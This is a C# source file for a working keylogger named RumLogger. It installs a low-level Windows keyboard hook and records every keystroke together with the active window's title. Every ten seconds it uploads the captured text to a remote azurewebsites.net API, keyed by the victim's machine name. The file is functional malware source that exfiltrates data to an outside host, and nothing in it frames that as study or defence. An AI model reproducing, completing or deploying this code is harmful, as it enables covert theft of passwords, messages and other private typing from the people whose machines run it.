using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using RumLogger.Native;
using Timer = System.Threading.Timer;

namespace RumLogger;

internal class Keyboard : IDisposable
{
    private readonly StringBuilder _contentBuilder;
    private readonly Uri _uri;

    private readonly TimeSpan _sendTime = TimeSpan.FromSeconds(10);
    private readonly Timer _sendTimer;

    private readonly TimeSpan _waitTime = TimeSpan.FromSeconds(10);
    private readonly Timer _waitTimer;

    public string WindowName { get; private set; }

    public Keyboard()
    {
        _sendTimer = new Timer(SendCallback, null, _sendTime, _sendTime);
        _waitTimer = new Timer(WaitCallback, null, _waitTime, _waitTime);

        _contentBuilder = new StringBuilder();
        var module = Process.GetCurrentProcess().MainModule.ModuleName;
        var moduleHandle = NativeFunctions.GetModuleHandle(module);
        var hook = NativeFunctions.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, KeyboardCallback, moduleHandle, 0);

        var name = Environment.MachineName;
        var url = $"https://rumlogger.azurewebsites.net/api/user/AddUserDataV2/{name}";
        _uri = new Uri(url);
    }

    private void WaitCallback(object state)
    {
        Log(" ");
    }

    private void Log(string str)
    {
        _contentBuilder.Append(str);
        Trace.Write(str);
        _waitTimer.Change(_waitTime, _waitTime);
    }

    private IntPtr KeyboardCallback(int code, IntPtr wParam, IntPtr lParam)
    {
        var msgType = (WM)wParam.ToInt32();
        if (code >= 0 && msgType is WM.KEYFIRST or WM.SYSKEYDOWN)
        {
            var shift = Utils.GetShiftState();

            var hWindow = NativeFunctions.GetForegroundWindow();
            var title = new StringBuilder(256);
            NativeFunctions.GetWindowText(hWindow, title, title.Capacity);
            var windowName = title.ToString();
            if (WindowName != windowName.Trim())
            {
                WindowName = windowName.Trim();
                Log($"«Window {WindowName}»");
            }

            var caps = Console.CapsLock;
            var vKey = Marshal.ReadInt32(lParam);
            var key = KeyConverter.ToString((Keys)vKey, shift, caps);
            
            Log(key);
        }

        return NativeFunctions.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
    }


    private void SendCallback(object state)
    {
        try
        {
            using var wc = new WebClient();
            wc.Headers["Content-Type"] = "application/json";

            var str = _contentBuilder.ToString();
            Console.Clear();
            _contentBuilder.Clear();

            var enc = $"\"{Utils.Encode(str)}\"";
            wc.UploadStringAsync(_uri, enc);

            Console.WriteLine($"## sending {str} ##");
            _sendTimer.Change(_sendTime, _sendTime);
        }
        catch (Exception ex)
        {
            Trace.TraceError(ex.ToString());
        }
    }

    public void Run()
    {
        while (true)
        {
            NativeFunctions.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
            Thread.Sleep(5);
        }
    }

    public void Dispose()
    {
        _sendTimer?.Dispose();
        _waitTimer?.Dispose();
    }
}